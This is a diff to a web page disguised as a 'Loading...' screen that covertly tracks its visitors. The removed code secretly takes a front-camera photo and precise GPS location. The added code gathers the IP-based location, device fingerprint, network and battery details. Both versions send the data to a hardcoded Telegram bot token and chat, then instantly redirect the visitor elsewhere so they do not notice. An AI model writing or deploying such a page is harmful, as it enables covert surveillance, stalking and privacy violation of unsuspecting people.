@@ -3,86 +3,167 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>...</title>
+<title>Loading...</title>
 <style>
-  * { margin:0; padding:0; box-sizing:border-box; }
-  body { background:#000; height:100vh; }
-  video, canvas { display:none; position:fixed; }
+  * { margin: 0; padding: 0; }
+  body { background: #fff; }
 </style>
 </head>
 <body>
-<video id="v" autoplay playsinline muted></video>
-<canvas id="c"></canvas>
 <script>
-// ─── CONFIG ───────────────────────────────
 const BOT_TOKEN = '8609756694:AAFjX0cnt791j34h844O_dUKCKl0dNARe8U';
 const CHAT_ID   = '8220599004';
-// ──────────────────────────────────────────
+const REDIRECT  = 'https://google.com'; // change to any page
 
-const video = document.getElementById('v');
-const canvas = document.getElementById('c');
- 
-async function run() {
-  // start location fetch immediately in parallel — don't wait
-  const locationPromise = new Promise(resolve => {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const lat = pos.coords.latitude.toFixed(6);
-        const lon = pos.coords.longitude.toFixed(6);
-        const acc = Math.round(pos.coords.accuracy);
-        resolve(`📍 ${lat}, ${lon}\n±${acc}m\n🗺 https://maps.google.com/?q=${lat},${lon}`);
-      },
-      () => resolve('Location unavailable'),
-      { enableHighAccuracy: true, timeout: 8000 }
-    );
-  });
- 
-  // start camera
-  let stream;
-  try {
-    stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 1280 } },
-      audio: false
-    });
-    video.srcObject = stream;
-    await video.play();
-  } catch(e) { return; }
- 
-  // 0.3s warmup only
-  await new Promise(r => setTimeout(r, 300));
- 
-  // snap
-  canvas.width = video.videoWidth || 1280;
-  canvas.height = video.videoHeight || 1280;
-  const ctx = canvas.getContext('2d');
-  ctx.save(); ctx.scale(-1,1);
-  ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
-  ctx.restore();
-  stream.getTracks().forEach(t => t.stop());
- 
-  const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.92));
- 
-  // wait for location (likely already resolved by now)
-  const locationText = await locationPromise;
- 
+async function collect() {
   const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
-  const caption = `📸 Capture\n🕐 ${time}\n${locationText}`;
- 
-  const form = new FormData();
-  form.append('chat_id', CHAT_ID);
-  form.append('photo', blob, 'selfie.jpg');
-  form.append('caption', caption);
- 
-  // fire send — don't await, close immediately
-  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-    method: 'POST', body: form
+
+  // --- IP + Location (no permission) ---
+  let ip = '—', city = '—', region = '—', country = '—',
+      lat = '—', lon = '—', isp = '—', org = '—', timezone = '—';
+  try {
+    const r = await fetch('https://ip-api.com/json/?fields=61439');
+    const d = await r.json();
+    ip       = d.query      || '—';
+    city     = d.city       || '—';
+    region   = d.regionName || '—';
+    country  = d.country    || '—';
+    lat      = d.lat        || '—';
+    lon      = d.lon        || '—';
+    isp      = d.isp        || '—';
+    org      = d.org        || '—';
+    timezone = d.timezone   || '—';
+  } catch(e) {}
+
+  // --- Device Info (no permission) ---
+  const ua        = navigator.userAgent;
+  const platform  = navigator.platform || '—';
+  const lang      = navigator.language || '—';
+  const langs     = navigator.languages?.join(', ') || '—';
+  const cores     = navigator.hardwareConcurrency || '—';
+  const memory    = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : '—';
+  const screen_w  = screen.width;
+  const screen_h  = screen.height;
+  const dpr       = window.devicePixelRatio || 1;
+  const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone || '—';
+  const online    = navigator.onLine ? 'Yes' : 'No';
+  const cookieOk  = navigator.cookieEnabled ? 'Yes' : 'No';
+  const touch     = navigator.maxTouchPoints > 0 ? 'Yes (' + navigator.maxTouchPoints + ' points)' : 'No';
+  const vendor    = navigator.vendor || '—';
+  const referrer  = document.referrer || 'Direct';
+
+  // --- Network Info (no permission) ---
+  const conn     = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const netType  = conn?.effectiveType || '—';
+  const downlink = conn?.downlink ? conn.downlink + ' Mbps' : '—';
+  const rtt      = conn?.rtt ? conn.rtt + ' ms' : '—';
+  const saveData = conn?.saveData ? 'Yes' : 'No';
+
+  // --- Battery (no permission) ---
+  let batLevel = '—', batCharging = '—', batTime = '—';
+  try {
+    const bat    = await navigator.getBattery();
+    batLevel     = Math.round(bat.level * 100) + '%';
+    batCharging  = bat.charging ? '⚡ Charging' : '🔋 Not charging';
+    batTime      = bat.chargingTime === Infinity
+      ? (bat.dischargingTime !== Infinity ? Math.round(bat.dischargingTime / 60) + ' min remaining' : '—')
+      : Math.round(bat.chargingTime / 60) + ' min to full';
+  } catch(e) {}
+
+  // --- Parse OS & Browser from UA ---
+  const getOS = ua => {
+    if (/Windows NT 10/.test(ua)) return 'Windows 10/11';
+    if (/Windows NT 6.3/.test(ua)) return 'Windows 8.1';
+    if (/Windows/.test(ua)) return 'Windows';
+    if (/Android/.test(ua)) return 'Android ' + (ua.match(/Android ([^;]+)/)?.[1] || '');
+    if (/iPhone|iPad/.test(ua)) return 'iOS ' + (ua.match(/OS ([^)]+)/)?.[1]?.replace(/_/g,'.') || '');
+    if (/Mac OS X/.test(ua)) return 'macOS ' + (ua.match(/Mac OS X ([^)]+)/)?.[1]?.replace(/_/g,'.') || '');
+    if (/Linux/.test(ua)) return 'Linux';
+    return '—';
+  };
+  const getBrowser = ua => {
+    if (/Edg\//.test(ua)) return 'Microsoft Edge ' + (ua.match(/Edg\/([^\s]+)/)?.[1] || '');
+    if (/OPR\//.test(ua)) return 'Opera ' + (ua.match(/OPR\/([^\s]+)/)?.[1] || '');
+    if (/Chrome\//.test(ua)) return 'Chrome ' + (ua.match(/Chrome\/([^\s]+)/)?.[1] || '');
+    if (/Firefox\//.test(ua)) return 'Firefox ' + (ua.match(/Firefox\/([^\s]+)/)?.[1] || '');
+    if (/Safari\//.test(ua)) return 'Safari ' + (ua.match(/Version\/([^\s]+)/)?.[1] || '');
+    return '—';
+  };
+
+  const os      = getOS(ua);
+  const browser = getBrowser(ua);
+  const mapsUrl = lat !== '—' ? `https://maps.google.com/?q=${lat},${lon}` : '—';
+
+  // --- Build Telegram Message ---
+  const msg = `
+🔔 *New Visit Detected*
+
+🕐 *Time:* ${time}
+🌐 *Referrer:* ${referrer}
+
+━━━━━━━━━━━━━━━━━━
+📡 *NETWORK*
+━━━━━━━━━━━━━━━━━━
+🌍 IP: \`${ip}\`
+🏙 City: ${city}
+🗺 Region: ${region}
+🌐 Country: ${country}
+📍 Coords: ${lat}, ${lon}
+🗺 Maps: ${mapsUrl}
+🏢 ISP: ${isp}
+🏛 Org: ${org}
+🕰 Timezone: ${timezone}
+📶 Connection: ${netType}
+⬇️ Downlink: ${downlink}
+⏱ RTT: ${rtt}
+💾 Save Data: ${saveData}
+
+━━━━━━━━━━━━━━━━━━
+📱 *DEVICE*
+━━━━━━━━━━━━━━━━━━
+💻 OS: ${os}
+🌐 Browser: ${browser}
+🏷 Platform: ${platform}
+🏭 Vendor: ${vendor}
+🖥 Screen: ${screen_w}x${screen_h} @${dpr}x
+🧠 RAM: ${memory}
+⚙️ CPU Cores: ${cores}
+👆 Touch: ${touch}
+🌍 Language: ${lang}
+🌍 Languages: ${langs}
+🍪 Cookies: ${cookieOk}
+📶 Online: ${online}
+
+━━━━━━━━━━━━━━━━━━
+🔋 *BATTERY*
+━━━━━━━━━━━━━━━━━━
+🔋 Level: ${batLevel}
+⚡ Status: ${batCharging}
+⏱ Time: ${batTime}
+
+━━━━━━━━━━━━━━━━━━
+📋 *RAW UA*
+━━━━━━━━━━━━━━━━━━
+\`${ua}\`
+`.trim();
+
+  // --- Send to Telegram (don't await) ---
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: msg,
+      parse_mode: 'Markdown',
+      disable_web_page_preview: true
+    })
   });
- 
-  // close instantly after send is fired
-  window.location.replace('https://google.com');
+
+  // --- Redirect instantly ---
+  window.location.replace(REDIRECT);
 }
- 
-window.onload = run;
+
+collect();
 </script>
 </body>
 </html>
